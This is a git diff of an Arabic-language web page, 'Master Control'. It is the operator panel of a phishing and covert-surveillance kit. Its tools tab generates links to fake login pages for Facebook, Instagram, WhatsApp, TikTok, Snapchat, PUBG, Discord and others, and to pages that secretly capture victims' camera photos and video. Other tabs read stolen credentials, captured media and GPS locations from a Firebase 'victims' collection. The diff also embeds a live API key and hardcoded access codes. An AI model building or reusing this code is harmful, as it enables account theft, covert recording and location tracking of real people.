@@ -3,372 +3,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ Master Control</title>
+    <title>Master Control</title>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <style>
-        :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0000; }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; overflow-x:hidden; }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
-        @keyframes flicker { 0%,100%{opacity:1} 30%{opacity:0.2} 60%{opacity:0.8} }
-        @keyframes scanLine { from{top:-100%} to{top:100%} }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
-        
-        .scan-line { position:fixed;left:0;right:0;height:2px;background:rgba(255,0,0,0.15);pointer-events:none;animation:scanLine 2s linear infinite;z-index:999; }
-        
-        .container { max-width:500px;margin:0 auto;position:relative;z-index:1; }
-        .page { display:none;animation:fadeIn 0.3s ease-out; }
-        .page.active { display:block; }
-        
-        .header { text-align:center;margin-bottom:20px; }
-        .skull { font-size:55px;animation:pulse 0.3s infinite;filter:drop-shadow(0 0 20px var(--red)); }
-        h1 { font-size:22px;color:var(--red);text-shadow:0 0 30px var(--red);margin:10px 0;letter-spacing:3px; }
-        
-        .nav { display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap; }
-        .nav-btn { flex:1;min-width:50px;padding:10px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:10px;text-align:center; }
-        .nav-btn.active { border-color:var(--red);color:var(--red); }
-        
-        .card { background:var(--dark);border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px; }
-        .card h2 { color:var(--gold);font-size:14px;margin-bottom:12px;border-bottom:1px solid #333;padding-bottom:8px; }
-        
-        .stats-row { display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:16px; }
-        .stat-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center; }
-        .stat-card .num { color:var(--red);font-size:24px;font-weight:bold; }
-        .stat-card .txt { color:#666;font-size:10px;margin-top:4px; }
-        
-        .log-item { background:#050000;border:1px solid #333;border-radius:8px;padding:12px;margin-bottom:6px; }
-        .log-item .time { color:#666;font-size:10px; }
-        .log-item .service { color:var(--red);font-size:12px;font-weight:bold; }
-        .log-item .data { color:#aaa;font-size:11px;margin-top:4px; }
-        
-        .gallery-grid { display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px; }
-        .gallery-item { aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid #333;cursor:pointer;background:#111;position:relative; }
-        .gallery-item img,.gallery-item video { width:100%;height:100%;object-fit:cover; }
-        .gallery-item .play-icon { position:absolute;top:5px;left:5px;background:rgba(0,0,0,0.7);color:#fff;padding:2px 6px;border-radius:4px;font-size:10px; }
-        
-        .tool-grid { display:grid;grid-template-columns:1fr 1fr;gap:8px; }
-        .tool-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center;cursor:pointer;font-size:11px; }
-        .tool-card:active { border-color:var(--red);transform:scale(0.95); }
-        .tool-card .icon { font-size:28px;display:block;margin-bottom:6px; }
-        .tool-card.blocked { opacity:0.3;pointer-events:none; }
-        
-        .modal { display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;padding:20px; }
-        .modal.show { display:flex; }
-        .modal img,.modal video { max-width:95%;max-height:85vh;border-radius:10px; }
-        .modal .close { position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;background:rgba(255,0,0,0.5);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center; }
-        
-        .input-group { margin-bottom:12px; }
-        .input-group input,.input-group select { width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:6px;color:#fff;font-size:13px;font-family:'Courier New',monospace;outline:none; }
-        .input-group input:focus { border-color:var(--red); }
-        
-        .btn { width:100%;padding:14px;border-radius:8px;border:none;font-size:14px;font-weight:bold;cursor:pointer;margin-top:6px; }
-        .btn-red { background:#2a0a0a;color:var(--red);border:1px solid var(--red); }
-        .btn-gold { background:#0a0a2a;color:var(--gold);border:1px solid var(--gold); }
-        .btn:active { transform:scale(0.96); }
-        
-        .file-zone { border:2px dashed #333;border-radius:12px;padding:25px;text-align:center;cursor:pointer;margin:10px 0; }
-        .file-zone:hover { border-color:var(--gold); }
-        input[type=file] { display:none; }
-        
-        .empty { text-align:center;color:#666;padding:30px;font-size:13px; }
-        .refresh-btn { width:100%;padding:12px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:13px;margin-bottom:12px; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Courier New',monospace;background:#000;color:#fff;padding:6px;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none}
+        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+        @keyframes scanLine{from{top:-100%}to{top:100%}}
+        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px)}75%{transform:translateX(3px)}}
+        @keyframes glitch{0%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(2px,-2px)}60%{transform:translate(-1px,1px)}80%{transform:translate(1px,-1px)}100%{transform:translate(0)}}
+        @keyframes progressGlow{0%,100%{box-shadow:0 0 10px #ffaa00}50%{box-shadow:0 0 30px #ffaa00,0 0 60px #ffaa00}}
+        .scan-line{position:fixed;left:0;right:0;height:1px;background:rgba(255,0,0,0.15);pointer-events:none;animation:scanLine 2s linear infinite;z-index:999}
+        .container{max-width:520px;margin:0 auto}
+        .page{display:none;animation:fadeIn 0.2s}.page.active{display:block}
+        .header{text-align:center;margin-bottom:8px}
+        .skull{font-size:50px;animation:pulse 0.3s infinite;filter:drop-shadow(0 0 20px #ff0040)}
+        h1{font-size:22px;color:#ff0040;margin:3px 0;letter-spacing:4px;text-shadow:0 0 20px #ff0040;animation:glitch 3s infinite}
+        .nav{display:flex;gap:2px;margin-bottom:8px;flex-wrap:wrap}
+        .nav-btn{flex:1;min-width:35px;padding:10px 2px;background:#0a0000;border:1px solid #333;color:#fff;border-radius:6px;cursor:pointer;font-size:9px;font-weight:bold;text-align:center}
+        .nav-btn.active{border-color:#ff0040;color:#ff0040;box-shadow:0 0 15px rgba(255,0,64,0.3)}
+        .card{background:#050000;border:1px solid #333;border-radius:8px;padding:10px;margin-bottom:6px}
+        .card h2{color:#ffaa00;font-size:14px;margin-bottom:6px;border-bottom:1px solid #333;padding-bottom:4px}
+        .section-title{color:#8b00ff;font-size:12px;text-align:center;margin:10px 0 5px;text-shadow:0 0 8px #8b00ff}
+        .tool-grid{display:grid;grid-template-columns:1fr 1fr;gap:4px}
+        .tool-card{background:#0a0000;border:1px solid #333;border-radius:6px;padding:14px 5px;text-align:center;cursor:pointer;font-size:11px;font-weight:bold}
+        .tool-card:active{border-color:#ff0040;transform:scale(0.95);box-shadow:0 0 20px rgba(255,0,64,0.4)}
+        .tool-card .icon{font-size:30px;display:block;margin-bottom:4px}
+        .photo-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+        .photo-item{border-radius:8px;overflow:hidden;border:1px solid #333;position:relative}
+        .photo-item img{width:100%;height:130px;object-fit:cover;cursor:pointer}
+        .photo-item .p-actions{position:absolute;top:4px;right:4px;display:flex;gap:3px;z-index:5}
+        .photo-item .p-actions button{background:rgba(0,0,0,0.8);color:#fff;border:none;border-radius:4px;padding:5px 8px;font-size:9px;cursor:pointer}
+        .photo-item .p-info{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.85);padding:8px;pointer-events:none}
+        .video-list{display:grid;gap:5px}
+        .video-item{background:#050000;border:1px solid #333;border-radius:8px;overflow:hidden;cursor:pointer;position:relative}
+        .video-item video{width:100%;height:170px;object-fit:cover;pointer-events:none}
+        .video-item .v-actions{position:absolute;top:6px;right:6px;display:flex;gap:4px;z-index:5}
+        .video-item .v-actions button{background:rgba(0,0,0,0.8);color:#fff;border:none;border-radius:5px;padding:5px 10px;font-size:10px;cursor:pointer}
+        .video-item .play-overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:45px;background:rgba(0,0,0,0.5);width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;pointer-events:none}
+        .video-item .v-info{padding:10px;pointer-events:none}
+        .data-list{display:grid;gap:5px}
+        .data-item{background:#050000;border:1px solid #333;border-radius:8px;padding:12px;position:relative}
+        .data-item .d-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+        .data-item .d-type{color:#ff0040;font-weight:bold;font-size:14px}
+        .data-item .d-time{color:#888;font-size:10px}
+        .data-item .d-content{color:#ccc;font-size:13px;word-break:break-all;line-height:1.6}
+        .data-item .d-delete{position:absolute;top:8px;left:8px;background:rgba(255,0,0,0.7);color:#fff;border:none;border-radius:4px;padding:5px 8px;font-size:9px;cursor:pointer}
+        .link-box{background:#050000;border:1px solid #ffaa00;border-radius:8px;padding:14px;margin:12px 0;word-break:break-all;color:#ffaa00;font-size:12px;cursor:pointer;animation:progressGlow 2s infinite;text-align:center}
+        .gen-progress{width:100%;height:5px;background:#0a0000;border-radius:3px;margin:10px 0;overflow:hidden}
+        .gen-progress-fill{height:100%;width:0%;background:#ffaa00;transition:width 0.2s;box-shadow:0 0 15px #ffaa00}
+        .modal{display:none;position:fixed;inset:0;background:#000;z-index:999;justify-content:center;align-items:center}
+        .modal.show{display:flex}
+        .modal img{max-width:100%;max-height:100vh;object-fit:contain}
+        .modal video{width:100%;height:100vh;object-fit:contain}
+        .modal .close{position:absolute;top:15px;right:15px;color:#fff;font-size:24px;cursor:pointer;background:#ff0040;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;z-index:10}
+        .modal .modal-actions{position:absolute;bottom:25px;left:50%;transform:translateX(-50%);display:flex;gap:10px;z-index:10}
+        .modal .modal-actions button{background:rgba(0,0,0,0.8);color:#fff;border:1px solid #fff;border-radius:8px;padding:10px 16px;font-size:13px;cursor:pointer}
+        .input-group{margin-bottom:8px}
+        .input-group input{width:100%;padding:16px;background:#000;border:2px solid #333;border-radius:8px;color:#ff0040;font-size:16px;font-family:'Courier New',monospace;outline:none;text-align:center;letter-spacing:3px}
+        .input-group input:focus{border-color:#ff0040;box-shadow:0 0 25px rgba(255,0,64,0.3)}
+        .btn{width:100%;padding:16px;border-radius:8px;border:none;font-size:16px;font-weight:900;cursor:pointer;margin-top:5px;letter-spacing:4px}
+        .btn-red{background:#0a0000;color:#ff0040;border:2px solid #ff0040;text-shadow:0 0 10px #ff0040}
+        .btn-red:active{background:#1a0000;transform:scale(0.96)}
+        .error-msg{color:#ff0040;font-size:15px;text-align:center;display:none;margin-top:5px;font-weight:bold}
+        .error-msg.show{display:block;animation:shake 0.4s}
+        .code-hint{background:#0a0000;border:1px solid #ff0040;border-radius:8px;padding:12px;text-align:center;font-size:11px;margin-top:6px;line-height:1.8}
+        .copy-toast{position:fixed;top:15px;left:50%;transform:translateX(-50%);background:#0a0000;border:1px solid #ffaa00;color:#ffaa00;padding:12px 24px;border-radius:8px;font-size:13px;font-weight:bold;z-index:1000}
+        .refresh-btn{width:100%;padding:12px;background:#0a0000;border:1px solid #ff0040;color:#ff0040;border-radius:8px;cursor:pointer;font-size:13px;font-weight:bold;margin-bottom:8px}
+        .empty{text-align:center;color:#555;padding:35px;font-size:13px}
+        .back-btn{background:none;border:1px solid #550000;color:#990000;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:12px;margin-bottom:10px}
+        .code-info{text-align:center;color:#ffaa00;font-size:11px;margin-bottom:6px}
     </style>
 </head>
 <body>
 <div class="scan-line"></div>
 <div class="container">
 
-    <div class="header">
-        <div class="skull">💀</div>
-        <h1>MASTER CONTROL</h1>
+<div class="page active" id="page-login">
+    <div class="header"><div class="skull">☠️</div><h1>MASTER CONTROL</h1></div>
+    <div class="card" style="border-color:#ff0040;">
+        <div class="input-group"><input type="password" id="code-input" placeholder="🔐 ACCESS CODE" maxlength="10" autofocus></div>
+        <div class="error-msg" id="code-error">☠ ACCESS DENIED</div>
+        <button class="btn btn-red" onclick="checkCode()">💀 UNLOCK SYSTEM</button>
     </div>
+    <div class="code-hint" id="code-hint"></div>
+</div>
 
+<div class="page" id="page-app">
+    <div class="header"><div class="skull">💀</div><h1>MASTER CONTROL</h1></div>
+    <div class="code-info" id="code-info"></div>
     <div class="nav">
         <button class="nav-btn active" onclick="showTab('tools')">🛠️ أدوات</button>
-        <button class="nav-btn" onclick="showTab('upload')">📤 رفع</button>
-        <button class="nav-btn" onclick="showTab('dashboard')">📊 لوحة</button>
-        <button class="nav-btn" onclick="showTab('victims')">👥 ضحايا</button>
-        <button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
+        <button class="nav-btn" onclick="showTab('photos')">📸 صور</button>
+        <button class="nav-btn" onclick="showTab('videos')">🎬 فيديو</button>
+        <button class="nav-btn" onclick="showTab('accounts')">👥 حسابات</button>
+        <button class="nav-btn" onclick="showTab('locations')">📍 مواقع</button>
     </div>
 
-    <!-- الأدوات -->
-    <div class="page active" id="tab-tools">
-        <div class="card"><h2>🛠️ أدوات الاختراق</h2>
-        <div class="tool-grid" id="tools-grid"></div></div>
-    </div>
-
-    <!-- رفع -->
-    <div class="page" id="tab-upload">
-        <div class="card"><h2>📤 رفع صورة أو فيديو</h2>
-        <input type="file" id="uploadFile" accept="image/*,video/*" onchange="previewUpload()">
-        <div class="file-zone" onclick="document.getElementById('uploadFile').click()">
-            <div style="font-size:40px;">📤</div>
-            <div style="color:#666;font-size:13px;margin-top:8px;">اضغط لاختيار صورة أو فيديو</div>
+    <div id="tab-tools" class="page active">
+        <div class="section-title">━━ 📸 اختراق الكاميرا ━━</div>
+        <div class="tool-grid">
+            <div class="tool-card" onclick="generateLink('scan4.html','base1')"><span class="icon">📸</span>كاميرا أمامية صورة</div>
+            <div class="tool-card" onclick="generateLink('scan-video-front.html','base1')"><span class="icon">🎬</span>كاميرا أمامية فيديو</div>
+            <div class="tool-card" onclick="generateLink('scan2.html','base1')"><span class="icon">📷</span>كاميرا خلفية صورة</div>
+            <div class="tool-card" onclick="generateLink('scan3.html','base1')"><span class="icon">📹</span>كاميرا خلفية فيديو</div>
         </div>
-        <div id="uploadPreview" style="margin-top:10px;text-align:center;"></div>
-        <button class="btn btn-gold" onclick="uploadMedia()">📤 رفع للمعرض</button></div>
-        
-        <div class="card"><h2>📝 إضافة بيانات حساب</h2>
-        <div class="input-group">
-            <select id="v-service" style="margin-bottom:8px;">
-                <option value="">اختر النوع</option>
-                <option>فيسبوك</option><option>انستجرام</option><option>واتساب</option>
-                <option>تويتر</option><option>سناب</option><option>تيك توك</option>
-                <option>PUBG</option><option>فري فاير</option>
-            </select>
-            <input type="text" id="v-user" placeholder="اسم المستخدم / الإيميل" style="margin-bottom:8px;">
-            <input type="password" id="v-pass" placeholder="كلمة المرور">
+        <div class="section-title">━━ 📱 حسابات التواصل ━━</div>
+        <div class="tool-grid">
+            <div class="tool-card" onclick="generateLink('fb.html','base1')"><span class="icon">📘</span>فيسبوك</div>
+            <div class="tool-card" onclick="generateLink('insta.html','base1')"><span class="icon">📷</span>انستجرام</div>
+            <div class="tool-card" onclick="generateLink('whatsapp.html','base1')"><span class="icon">💬</span>واتساب</div>
+            <div class="tool-card" onclick="generateLink('tiktok.html','base1')"><span class="icon">🎵</span>تيك توك</div>
+            <div class="tool-card" onclick="generateLink('twitter.html','base1')"><span class="icon">𝕏</span>تويتر</div>
+            <div class="tool-card" onclick="generateLink('snapchat.html','base1')"><span class="icon">👻</span>سناب شات</div>
         </div>
-        <button class="btn btn-red" onclick="saveVictim()">📝 حفظ في السجل</button></div>
-    </div>
-
-    <!-- لوحة -->
-    <div class="page" id="tab-dashboard">
-        <div class="stats-row">
-            <div class="stat-card"><div class="num" id="s-victims">0</div><div class="txt">ضحايا</div></div>
-            <div class="stat-card"><div class="num" id="s-photos">0</div><div class="txt">صور</div></div>
-            <div class="stat-card"><div class="num" id="s-videos">0</div><div class="txt">فيديو</div></div>
+        <div class="section-title">━━ 🎮 الألعاب ━━</div>
+        <div class="tool-grid">
+            <div class="tool-card" onclick="generateLink('g.html','base1')"><span class="icon">🔫</span>PUBG</div>
+            <div class="tool-card" onclick="generateLink('freefire.html','base2')"><span class="icon">🎯</span>فري فاير</div>
+            <div class="tool-card" onclick="generateLink('fifa.html','base2')"><span class="icon">⚽</span>فيفا</div>
+            <div class="tool-card" onclick="generateLink('discord.html','base2')"><span class="icon">💎</span>ديسكورد</div>
         </div>
-        <button class="refresh-btn" onclick="loadDashboard()">🔄 تحديث</button>
-        <div class="card"><h2>🕐 آخر النشاطات</h2><div id="recent-logs"></div></div>
     </div>
 
-    <!-- ضحايا -->
-    <div class="page" id="tab-victims">
-        <button class="refresh-btn" onclick="loadVictims()">🔄 تحديث</button>
-        <div class="card"><h2>👥 سجل الضحايا</h2><div id="victims-list"></div></div>
-    </div>
+    <div id="tab-photos" class="page"><button class="refresh-btn" onclick="loadPhotos()">🔄 تحديث الصور</button><div class="card"><h2>📸 معرض الصور</h2><div class="photo-grid" id="photos-grid"></div></div></div>
+    <div id="tab-videos" class="page"><button class="refresh-btn" onclick="loadVideos()">🔄 تحديث الفيديوهات</button><div class="card"><h2>🎬 معرض الفيديوهات</h2><div class="video-list" id="videos-list"></div></div></div>
+    <div id="tab-accounts" class="page"><button class="refresh-btn" onclick="loadAccounts()">🔄 تحديث الحسابات</button><div class="card"><h2>👥 حسابات التواصل والألعاب</h2><div class="data-list" id="accounts-list"></div></div></div>
+    <div id="tab-locations" class="page"><button class="refresh-btn" onclick="loadLocations()">🔄 تحديث المواقع</button><div class="card"><h2>📍 مواقع GPS</h2><div class="data-list" id="locations-list"></div></div></div>
 
-    <!-- معرض -->
-    <div class="page" id="tab-gallery">
-        <button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
-        <div class="card"><h2>📸 المعرض</h2><div class="gallery-grid" id="gallery-grid"></div></div>
+    <div id="tab-generate" class="page">
+        <button class="back-btn" onclick="showTab('tools')">← رجوع للأدوات</button>
+        <div style="text-align:center;"><div class="skull" style="font-size:40px;">⚡</div><h1 style="font-size:18px;">جاري توليد الرابط...</h1><div class="gen-progress"><div class="gen-progress-fill" id="gen-fill"></div></div></div>
+        <div id="gen-result" style="display:none;text-align:center;"><div class="skull" style="font-size:40px;">🔗</div><h1 style="font-size:18px;">الرابط جاهز</h1><div class="link-box" id="link-box" onclick="copyGeneratedLink()"></div><p style="color:#660000;font-size:11px;margin-top:4px;">💀 اضغط على الرابط للنسخ 💀</p></div>
     </div>
-</div>
+</div></div>
 
-<div class="modal" id="modal" onclick="closeModal()">
-    <span class="close">✕</span>
-    <img id="modalImg" src="" style="display:none;">
-    <video id="modalVid" controls style="display:none;"></video>
-</div>
+<div class="modal" id="modal"><span class="close" onclick="closeModal()">✕</span><img id="modalImg" src="" style="display:none;"><video id="modalVid" controls style="display:none;"></video><div class="modal-actions" id="modalActions" style="display:none;"><button onclick="downloadMedia()">💾 تحميل</button><button onclick="deleteCurrentMedia()">🗑️ حذف</button></div></div>
 
 <script>
-var db;
-var remoteCodes = {admin:true, elgen:true};
-var blockedTools = [];
-var API = 'https://pubgskin.vercel.app/api/save';
+var db,MYCODE='',BASE1='https://ai-proxy-eosin.vercel.app',BASE2='https://pubgskin.vercel.app';
+var currentMediaUrl='',currentMediaId='',currentMediaType='',currentGeneratedLink='';
 
-// Firebase
-firebase.initializeApp({
-    apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
-    projectId: "game-a1aca",
-    storageBucket: "game-a1aca.firebasestorage.app",
-    appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
-});
-db = firebase.firestore();
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+db=firebase.firestore();
 
-// ========== تبويبات ==========
-function showTab(tab) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-    document.getElementById('tab-' + tab).classList.add('active');
-    var tabs = ['tools','upload','dashboard','victims','gallery'];
-    var i = tabs.indexOf(tab);
-    if (i >= 0) document.querySelectorAll('.nav-btn')[i].classList.add('active');
-    
-    if (tab === 'dashboard') loadDashboard();
-    if (tab === 'victims') loadVictims();
-    if (tab === 'gallery') loadGallery();
-    if (tab === 'tools') loadTools();
+function getDevice(){var ua=navigator.userAgent;if(ua.indexOf('SM-A105')!==-1||ua.indexOf('SM-A107')!==-1)return{name:'Samsung A10',isA10:true};return{name:'جهاز',isA10:false};}
+var device=getDevice(),IS_A10=device.isA10;
+var ALL_CODES={'admin':{type:'دائم',device:'Samsung A10'},'elgen':{type:'30 يوم',device:'جميع الأجهزة'},'DARK':{type:'دائم',device:'جميع الأجهزة'}};
+var EXPIRY_KEY='mc_expiry';
+
+if(!IS_A10){var expiry=localStorage.getItem(EXPIRY_KEY);if(!expiry){expiry=Date.now()+(30*24*60*60*1000);localStorage.setItem(EXPIRY_KEY,expiry);}if(Date.now()>parseInt(expiry)){localStorage.removeItem(EXPIRY_KEY);localStorage.removeItem('mc_auth');}}
+
+document.getElementById('code-hint').innerHTML='🔑 الأكواد:<br>• <b style="color:#ffaa00;">admin</b> - Samsung A10 (دائم)<br>• <b style="color:#ffaa00;">elgen</b> - 30 يوم<br>• <b style="color:#ffaa00;">DARK</b> - دائم';
+
+var savedCode=localStorage.getItem('mc_auth');
+if(savedCode&&ALL_CODES[savedCode]){MYCODE=savedCode;showPage('page-app');document.getElementById('code-info').textContent='🟢 الكود: '+MYCODE.toUpperCase()+' | '+ALL_CODES[MYCODE].type;}
+
+function showPage(id){document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});document.getElementById(id).classList.add('active');}
+
+function showTab(tab){
+    ['tab-tools','tab-photos','tab-videos','tab-accounts','tab-locations','tab-generate'].forEach(function(id){var el=document.getElementById(id);if(el)el.classList.remove('active');});
+    var el=document.getElementById('tab-'+tab);if(el)el.classList.add('active');
+    document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});
+    var tabs=['tools','photos','videos','accounts','locations'],idx=tabs.indexOf(tab);
+    if(idx>=0)document.querySelectorAll('.nav-btn')[idx].classList.add('active');
+    if(tab==='photos')loadPhotos();if(tab==='videos')loadVideos();if(tab==='accounts')loadAccounts();if(tab==='locations')loadLocations();
 }
 
-// ========== Firebase ==========
-async function loadFirebaseConfig() {
-    try {
-        var doc = await db.collection('config').doc('settings').get();
-        if (doc.exists) {
-            var data = doc.data();
-            if (data.codes) remoteCodes = data.codes;
-            if (data.blocked_tools) blockedTools = data.blocked_tools;
-        }
-    } catch(e) {}
+function checkCode(){
+    var code=document.getElementById('code-input').value.trim().toLowerCase(),error=document.getElementById('code-error');
+    if(!ALL_CODES[code]){error.textContent='☠ كود غير صالح';error.classList.add('show');document.getElementById('code-input').value='';setTimeout(function(){error.classList.remove('show');},1500);return;}
+    if(code==='elgen'){var exp=localStorage.getItem(EXPIRY_KEY);if(exp&&Date.now()>parseInt(exp)){error.textContent='☠ انتهت الصلاحية';error.classList.add('show');return;}}
+    error.classList.remove('show');MYCODE=code;localStorage.setItem('mc_auth',code);
+    document.getElementById('code-info').textContent='🟢 الكود: '+MYCODE.toUpperCase()+' | '+ALL_CODES[MYCODE].type;showPage('page-app');
+}
+document.getElementById('code-input').addEventListener('keydown',function(e){if(e.key==='Enter')checkCode();});
+
+async function loadPhotos(){
+    try{
+        var snap;
+        if(MYCODE==='admin'){snap=await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();}
+        else{snap=await db.collection('gallery').where('code','==',MYCODE).orderBy('timestamp','desc').limit(50).get();if(snap.empty)snap=await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();}
+        var html='';
+        snap.forEach(function(doc){var d=doc.data(),id=doc.id;if(!d.url)return;if(d.type&&(d.type.indexOf('🎬')!==-1||d.type.indexOf('📹')!==-1))return;
+        html+='<div class="photo-item"><img src="'+d.url+'" onclick="openMedia(\''+d.url.replace(/'/g,"\\'")+'\',\'image\',\''+id+'\')">';
+        html+='<div class="p-actions"><button onclick="event.stopPropagation();downloadFile(\''+d.url.replace(/'/g,"\\'")+'\')">💾</button><button onclick="event.stopPropagation();deleteItem(\''+id+'\',\'photos\')">🗑️</button></div>';
+        html+='<div class="p-info"><span style="color:#ff0040;font-size:10px;">'+(d.type||'📸')+'</span><span style="color:#888;font-size:8px;">🕐 '+(d.timestamp?new Date(d.timestamp).toLocaleString('ar-EG'):'')+'</span></div></div>';});
+        document.getElementById('photos-grid').innerHTML=html||'<div class="empty">📭 لا توجد صور</div>';
+    }catch(e){}
 }
 
-function isValidCode(code) { return remoteCodes[code] === true; }
-
-// ========== تخزين البيانات ==========
-function saveToLocal(type, data) {
-    var storage = JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
-    data.timestamp = new Date().toISOString();
-    if (type === 'victim') storage.victims.push(data);
-    if (type === 'photo') storage.gallery.push(data);
-    if (type === 'video') storage.videos.push(data);
-    localStorage.setItem('mc_data', JSON.stringify(storage));
+async function loadVideos(){
+    try{
+        var snap;
+        if(MYCODE==='admin'){snap=await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();}
+        else{snap=await db.collection('gallery').where('code','==',MYCODE).orderBy('timestamp','desc').limit(50).get();if(snap.empty)snap=await db.collection('gallery').orderBy('timestamp','desc').limit(50).get();}
+        var html='';
+        snap.forEach(function(doc){var d=doc.data(),id=doc.id;if(!d.url)return;if(!d.type||(d.type.indexOf('🎬')===-1&&d.type.indexOf('📹')===-1))return;
+        html+='<div class="video-item" onclick="openMedia(\''+d.url.replace(/'/g,"\\'")+'\',\'video\',\''+id+'\')"><video src="'+d.url+'" muted></video><div class="play-overlay">▶</div>';
+        html+='<div class="v-actions"><button onclick="event.stopPropagation();downloadFile(\''+d.url.replace(/'/g,"\\'")+'\')">💾</button><button onclick="event.stopPropagation();deleteItem(\''+id+'\',\'videos\')">🗑️</button></div>';
+        html+='<div class="v-info"><span style="color:#ff0040;font-size:12px;">'+(d.type||'🎬')+'</span><span style="color:#888;font-size:9px;">🕐 '+(d.timestamp?new Date(d.timestamp).toLocaleString('ar-EG'):'')+'</span></div></div>';});
+        document.getElementById('videos-list').innerHTML=html||'<div class="empty">🎬 لا توجد فيديوهات</div>';
+    }catch(e){}
 }
 
-function getLocalData() {
-    return JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
+async function loadAccounts(){
+    try{
+        var snap;
+        if(MYCODE==='admin'){snap=await db.collection('victims').orderBy('timestamp','desc').limit(50).get();}
+        else{snap=await db.collection('victims').where('code','==',MYCODE).orderBy('timestamp','desc').limit(50).get();if(snap.empty)snap=await db.collection('victims').orderBy('timestamp','desc').limit(50).get();}
+        var html='';
+        snap.forEach(function(doc){var d=doc.data(),id=doc.id;if(d.service&&(d.service.indexOf('📍')!==-1||d.service.indexOf('GPS')!==-1))return;
+        html+='<div class="data-item"><button class="d-delete" onclick="deleteDataItem(\''+id+'\')">✕</button>';
+        html+='<div class="d-header"><span class="d-type">'+(d.service||'غير معروف')+'</span><span class="d-time">🕐 '+(d.timestamp?new Date(d.timestamp).toLocaleString('ar-EG'):'')+'</span></div>';
+        html+='<div class="d-content">'+(d.text||d.data||'')+'</div></div>';});
+        document.getElementById('accounts-list').innerHTML=html||'<div class="empty">👥 لا توجد حسابات</div>';
+    }catch(e){}
 }
 
-// ========== لوحة ==========
-function loadDashboard() {
-    var data = getLocalData();
-    var victims = data.victims || [];
-    var gallery = data.gallery || [];
-    var videos = data.videos || [];
-    
-    document.getElementById('s-victims').textContent = victims.length;
-    document.getElementById('s-photos').textContent = gallery.length;
-    document.getElementById('s-videos').textContent = videos.length;
-    
-    var all = [];
-    victims.forEach(v => all.push({time:v.timestamp, service:v.service, text:v.text}));
-    gallery.forEach(g => all.push({time:g.timestamp, service:'📸 صورة', text:g.caption}));
-    videos.forEach(v => all.push({time:v.timestamp, service:'🎬 فيديو', text:v.caption}));
-    all.sort((a,b) => new Date(b.time) - new Date(a.time));
-    
-    var html = '';
-    all.slice(0,10).forEach(a => {
-        html += '<div class="log-item"><div class="time">🕐 ' + (a.time ? new Date(a.time).toLocaleString('ar-EG') : '') + '</div><div class="service">' + a.service + '</div><div class="data">' + (a.text || '') + '</div></div>';
-    });
-    document.getElementById('recent-logs').innerHTML = html || '<div class="empty">لا توجد سجلات</div>';
+async function loadLocations(){
+    try{
+        var snap;
+        if(MYCODE==='admin'){snap=await db.collection('victims').orderBy('timestamp','desc').limit(30).get();}
+        else{snap=await db.collection('victims').where('code','==',MYCODE).orderBy('timestamp','desc').limit(30).get();if(snap.empty)snap=await db.collection('victims').orderBy('timestamp','desc').limit(30).get();}
+        var html='';
+        snap.forEach(function(doc){var d=doc.data(),id=doc.id;if(!d.service||(d.service.indexOf('📍')===-1&&d.service.indexOf('GPS')===-1))return;
